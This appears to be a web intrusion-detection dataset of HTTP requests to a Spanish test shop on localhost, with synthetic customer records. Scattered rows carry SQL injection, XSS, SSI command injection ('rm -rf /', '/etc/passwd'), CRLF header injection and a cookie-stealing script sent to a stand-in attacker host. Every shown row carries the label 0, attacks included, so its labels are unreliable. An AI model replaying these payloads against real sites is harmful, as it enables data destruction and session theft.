GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg.Old HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=25&B1A=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,idA=1,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7334bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=Confirmar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=3&nombre=Queso+Manchego&precio=39%2F&cantidad=57&B1=A%F1adir+al+carrito,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=beate&pwd=esp8rtillero&remember=off&B1=%2500 HTTP/1.1,,0
GET http://localhost:8080/homepage.nsf HTTP/1.1,,0
GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif/.bak HTTP/1.1,,0
GET http://localhost:8080/CFIDE/administrator/welcomeexapps.cfm HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarAND+1%3D1&precio=252&B1=Confirmar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,idA=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=74&B1=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,idA=2,0
PUT http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=dawn8&password=0H8bUQu%CD&nombre=Quinciano&apellidos=Manzanera+Agudo&email=cervi%40zingtonos.mv&dni=11051114M&direccion=C%2F+Poceros%2C+29%2C+&ciudad=Anna&cp=37797&provincia=Ourense&ntc=5688192527960477&B1=Registrar,0
GET http://localhost:8080/samples/sampsite/results.htm HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=2%2F&nombre=Queso+Manchego&precio=85&cantidad=12&B1=A%F1adir+al+carrito,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,,0
GET http://localhost:8080/tienda1/asf-logo-wide HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsgA=Credenciales+incorrectas,0
GET http://localhost:8080.BAK HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fleurima&password=sa924a9u25&nombre=Ladislada&apellidos=Aregall+Picabea&email=ursitti%40nightflight.dm&dni=88865484Q&direccion=Merced%2C+63+&ciudad=Valdemierque&cp=08784&provincia=S%2Falaman%2Bc.a&ntc=5240985649337180&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%4040&login=carolien&pwd=p68vILl7Ja6&remember=on&B1=Entrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=roig&password=a4ev1l19&nombre=Ra%FAl&apellidosA=Esterric+Bou&email=munshin%40cirugiaplasticacordoba.hk&dni=42473286Z&direccion=Avda.+Sanlucar+De+Barrameda+78+5-B&ciudad=Alcaraz&cp=40291&provincia=Huesca&ntc=4538972829961563&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%2520&login=shirai&pwd=3897r%24314m78t8&remember=off&B1=Entrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=98&B1=A%F1adir+al+carrito HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,,0
GET http://localhost:8080/tienda1/global.Bak HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&loginA=ness&pwd=excuSAdor&remember=off&B1=Entrar,0
GET http://localhost:8080/tienda1.inc HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,B2A=Vaciar+carrito,0
GET http://localhost:8080/tienda1/imagenes/3.gif/6909030637832563290.jsp HTTP/1.1,,0
GET http://localhost:8080/examplesWebApp/EJBeanManagedClient.jsp HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dirk&password=8d0n23&nombre=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&apellidos=Caparr%E0s+Bujan&email=bunnag%40djbroadcast.me&dni=05409515F&direccion=Calle+Incas%2C+159%2C+5%3FA&ciudad=Busturia&cp=29410&provincia=Le%F3n&ntc=9280136087068381&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,id=%22+AND+%221%22%3D%221,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Vino+Rioja&precio=85&cantidad=63&B1=A%F1adir+al+carrito HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=68&B1=A%F1adir+al+carrito,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=jiann&password=freno&nombre=Raifroid&apellidos=Sol%E1+Portillo&email=nererova%40camilafansite.by&dni=41955080K&direccion=C%2F+Fusta+40+11-F&ciudad=San+Pablo+de+los+Montes&cpA=49333&provincia=Burgos&ntc=5510588122545598&B1=Registrar,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=purnell&password=49pu%2B22&nombre=Lavinia&apellidos=Preisz&email=carslisle%40cirujanaplastica.ck&dni=99142820DSet-cookie%253A%2BTamper%253D1041264011025374727&direccion=Calle+Santa+Agueda+162+5%3FC&ciudad=Arroyo+del+Ojanco&cp=10893&provincia=Ciudad+Real&ntc=5833239568926901&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,B2=Vaciar+carrito%4040,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Vino+Rioja&precio=85&cantidad=18&B1=A%F1adir+al+carrito HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vera&password=0ip0rbol1id7&nombre=Samay&apellidos=Artells+Arteta&email=henn_others%40lasmilyuna.gi&dni=13605020Z&direccion=Paseo+Alcalde+Rafael+Ginel%2C+121+%253F&ciudad=Fuentelisendo&cp=09219&provincia=Madrid&ntc=6311255681512253&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=kolahi45&password=o5%2457t4&nombre=Segismundo&apellidos=Torr%E0&email=unkel-richler%40nanogenerador.bu&dni=482865631&direccion=Calle+Puerto+Oncala%2C+80%2C+7%3FG&ciudad=Almazul&cp=20495&provincia=Navarra&ntc=9824241120494731&B1=Registrar,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=guendole&password=picoteado&nombre=Calixta&apellidos=Bergu%EDo+Franceschini&email=mullican_oliver%40%40sayuela.sa&dni=37147257A&direccion=Cronista+Ildefonso+Rodriguez+103+&ciudad=Ispaster&cp=24322&provincia=Zaragoza&ntc=3071106416830045&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/global.java HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=3&nombreA=Queso+Manchego&precio=100&cantidad=45&B1=A%F1adir+al+carrito,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=monaco&password=rOZnar&nombre=Kiara&apellidos=Palenzuela+Usa&email=badland.paudler%40dise%F1odesoftware.do&dni=86214709Z&direccion=C%2F+Alegria%2C+141%2C+12-H&ciudad=Villanueva+de+Oscos%22+AND+%221%22%3D%221&cp=24735&provincia=Ciudad+Real&ntc=4654942357042652&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stevan&passwordA=farropea&nombre=Nubia&apellidos=Esteba+Estradera&email=mauri%40coworkers.gy&dni=04564890B&direccion=Peiraos%2C+142+5A&ciudad=Breda&cp=46892&provincia=M%E1laga&ntc=5977636857808544&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=7701&B1=Confirmar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precio=7363&B1A=Pasar+por+caja,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lilllie8&pwd=4mpo599c7mientoSet-cookie%253A%2BTamper%253D1041264011025374727&remember=on&B1=Entrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chandras&pwd=h%2Bolgona&remember=on&B1A=Entrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precio=7931&B1=Pasar+por+caja%2F,0
GET http://localhost:8080/tienda1/miembros/salir.jsp/6909030637832563290.jsp.Inc HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?idA=1&nombre=Queso+Manchego&precio=100&cantidad=5&B1=A%F1adir+al+carrito HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,idA=1,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar&precio=1980&B1=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=beate&password=l%F3brega&nombre=Fiona&apellidos=Aguilar+Sanz&email=glassberg%40professionalhosting.com.tf&dni=09324887C&direccion=Carrer+Castell+84%2C+&ciudadA=Peque&cp=06177&provincia=M%E1laga&ntc=2283238465616456&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=aggi&password=S7mI2usA&nombre=Maijhara&apellidos=Sanz&email=richman-garrison%40manzanilladevillafafila.fj&dni=59195753D&direccion=Calle+Bu%F1ola+8%2C+&ciudadA=Ayamonte&cp=47860&provincia=Palencia&ntc=3373998516659876&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=baughan&password=piache&nombre=Umberto&apellidos=Sans+Oc%F3n&email=rutherford%40cumbareback.ly&dni=99500842J&direccion=C%2F+Isidoro+Millan+Mari%F1o+14%2C+9%3FF&ciudad=Veganzones&cp=1914A&provincia=Barcelona&ntc=3563768127894231&B1=Registrar,0
GET http://localhost:8080/_cti_pvt/services.cnf HTTP/1.1,,0
GET http://localhost:8080/tienda1/imagenes/2.gif.inc HTTP/1.1,,0
GET http://localhost:8080/scripts/tools/drvrs.exe HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dni=59059811C&direccion=Cal*l%2Be+Ovidio+S%2FN+12-G&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jyoti&password=dechado&nombre=Tercero&apellidosA=Bori+Raich&email=varhelyi_krzyzewska%40santacruzdelvoto.mw&dni=87721362Y&direccion=Dulcinea%2C+158%2C+4%3FG&ciudad=Valverde+del+Camino&cp=19190&provincia=Cuenca&ntc=4412645005602081&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/asf-logo-wide.gif/~ HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modoA=insertar&precio=8158&B1=Pasar+por+caja,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=corace&pwd=ahorrAdOr&remember=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Entrar,0
GET http://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=devore&pwd=por35zo&rememberA=on&B1=Entrar HTTP/1.1,,0
PUT http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,B2=Vaciar+carrito,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=destry&password=26sEmbLe&nombre=Wenceslao&apellidos=Machado+Labarca&email=pasqual%40stockdefotos.tel&dni=80999708X&direccion=Pedre%F1a+197+10%3FH&ciudad=Cubillo+de+Uceda%2C+El&cp=43151&provincia=Teruel&ntc=0708219176163620&B1A=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=3&nombre=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=85&cantidad=57&B1=A%F1adir+al+carrito,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mihran&password=m241a6ear&nombre=Denisa&apellidos=Zabala+Gorostiza&email=kusunoki%40pcmarbella.lv&dni=46586421J&direccion=Valcuerna+46+&ciudad=Villamayor+de+Calatrava&cp=09558&provinciaA=Zaragoza&ntc=3440353335375229&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=defalco&password=botonesSet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Suyai&apellidos=R%E1bago+Patraca&email=ghenaiem_berlin%40hipotecascom.je&dni=24778234N&direccion=C%2F+La+Salpa+104%2C+&ciudad=Moral+de+la+Reina&cp=10334&provincia=Burgos&ntc=5823821605242067&B1=Registrar,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=*corn%27eliu&pwd=dESHILadIZ&remember=off&B1=Entrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsgA=Credenciales+incorrectas,0
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=nancie&pwd=Pl0NTo&remember=on&B1=Entrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide.gif/ HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,idA=1,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sorkin&password=engordadora&nombre=Shakira&apellidos=Mej%EDa+Ferr%E9s&email=boudaoudi-griffeth%40muchacha.com.dz&dni=13074085B&direccion=C%2F+Virgen+De+La+Paloma+31+12%3FH&ciudad=Pedroso+de+la+Armu%F1a%2C+El&cp=03277&provincia=%3F%C1.vila&ntc=2500333938712142&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,idA=1,0
GET http://localhost:8080/tienda1/asf-logo-wide HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=4250&B1=Pasar+por+caja HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/ HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=melisse&pwd=pleit%E9s&remember=onAND+1%3D1&B1=Entrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=eluned&pwd=p8paH7g6&remember=on&B1A=Entrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,B2A=Vaciar+carrito,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%2520 HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertarparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&precio=5514&B1=Pasar+por+caja,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=horng&password=Tablaz%F3N&nombre=*Aitan%2Fa&apellidos=Salguero+Peri&email=hyland%40magritte.pm&dni=64709043S&direccion=Dieciocho+De+Julio%2C+83+&ciudad=Li%E9tor&cp=11139&provincia=Valencia&ntc=9930911410161523&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=wilken&pwd=r5pa2el0s&rememberA=on&B1=Entrar,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=boschin&password=3189p6zada&nombre=Amadis&apellidos=Funes+Port%E9s&email=gracie%40triplectextil.me&dni=81791661G&direccion=Plza.+Beato+Andres+Hiberno%2Bn%2C+63+9A&ciudad=Pedrosillo+de+los+Aires&cp=03345&provincia=Guadalajara&ntc=1272948221132397&B1=Registrar,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=19&B1=A%F1adir+al+carrito,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=linebarg&password=6A6ejo&nombre=Adiberto&apellidos=Baro+Guizasola&email=knoch%40cortinasartesol.rs&dni=40660740Y&direccion=Calle+Rio+Nervion%2C+124+&ciudad=Villalbilla&cp=10269&provincia=Asturias&ntc=3612762380089374&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=reiser&password=fi33%F38841&nombre=Palmira&apellidos=Rocha+Pello&email=terry-lewis.macdougall%40ofertaschinas.gd&dni=46644989T%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&direccion=Calle+Los+Hotelitos+S%2FN%2C+&ciudad=Alforja&cp=06200&provincia=Madrid&ntc=6898289931368660&B1=Registrar,0
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,id=1&nombreA=Jam%F3n+Ib%E9rico&precio=100&cantidad=71&B1=A%F1adir+al+carrito,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precioA=39&cantidad=27&B1=A%F1adir+al+carrito HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,,0
GET http://localhost:8080/IISSamples/sdk/asp/database/LimitRows_VBScript.asp HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=apollo&pwd=hepta8qu%EDa&remember=off&B1=Entrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hu*yv%3Fan&password=atab2rdi8la7O&nombre=Adelfo&apellidos=Stumptner&email=lembeck%40tuslimites.fo&dni=72510261R&direccion=Passeig+Bejar%2C+173+2H&ciudad=Quir%F3s&cp=41930&provincia=Girona&ntc=9285059001165712&B1=Registrar HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=85&B1=A%F1adir+al+carrito HTTP/1.1,,0
GET http://localhost:8080/tienda1/miembros.BAK HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=c%2F%3Fa%2Cry&pwd=0ara7s5o&remember=on&B1=Entrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,modo=registro&login=adriaans&password=desl%E1nguido&nombre=Patrocinia&apellidos=Mas+Suy&email=unicorn%40devuelos.ru&dni=36844743P&direccion=Calle+Ondara+38+3%3FB&ciudad=Ayala%2FAiara&cp=33785&provincia=Ja%E9n&ntc=2773760361934334&B1A=Registrar,0
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7191&B1=Confirmar%2F HTTP/1.1,,0
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,modo=registro&login=clark-st&password=4A4R5R&nombre=Semiramis&apellidos=Chapi+Vieira&email=tirard_lamore%40biosoftware.cv&dni=88665105J&direccion=Calle+Miguel+Romero+Matinez+S%2FN%2C+&ciudad=Sayalonga&cp=09227&provincia=L%3Fa+Ri%3Foj*a&ntc=2618138569718823&B1=Registrar,0
GET http://localhost:8080/iisstart.htm HTTP/1.1,,0
GET http://localhost:8080/tienda1/imagenes/logo.gif/.Old HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=31&B1=A%F1adir+al+carrito%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,idA=1,0
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marconi1&password=adularia&nombre=Venancio&apellidos=Del+Campillo+Aranda&email=blier%40ropadegolf.com.at&dni=B421621B19Z&direccion=Paratge+Pla+18+8%3FD&ciudad=Sotorribas&cp=15391&provincia=Soria&ntc=6078216616409598&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,errorMsgA=Credenciales+incorrectas,0
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,modo=entrar&login=mcnair&pwd=81cob6r&remember=off&B1A=Entrar,0
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito HTTP/1.1,,0
GET http://localhost:8080/examplesWebApp/EJBeanManagedClient.jsp HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,modo=insertar%3F&precio=9014&B1=Confirmar,0
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=subraman&password=rectificadora&nombre=Nehem%EDas&apellidos=%252B&email=law%40ankawaelda.au&dni=13570261P&direccion=o+Riomao+36%2C+8%3FF&ciudad=Villar+de+Peralonso&cp=13429&provincia=M%E1laga&ntc=5016740108170299&B1=Registrar HTTP/1.1,,0
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,0
